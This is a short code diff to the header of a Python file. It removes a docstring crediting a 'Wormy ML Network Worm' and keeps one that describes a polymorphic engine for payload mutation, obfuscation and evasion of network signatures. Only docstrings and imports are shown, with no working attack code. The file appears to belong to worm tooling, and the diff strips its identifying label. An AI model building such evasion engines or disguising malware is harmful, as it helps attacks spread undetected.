@@ -1,14 +1,7 @@
 """
-Wormy ML Network Worm v3.0
-Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
-Copyright (c) 2024 Ruby570bocadito. All rights reserved.
-"""
-
-"""
 Polymorphic Engine
 Payload mutation, code obfuscation, and network signature evasion
 """
-
 
 import base64
 import hashlib
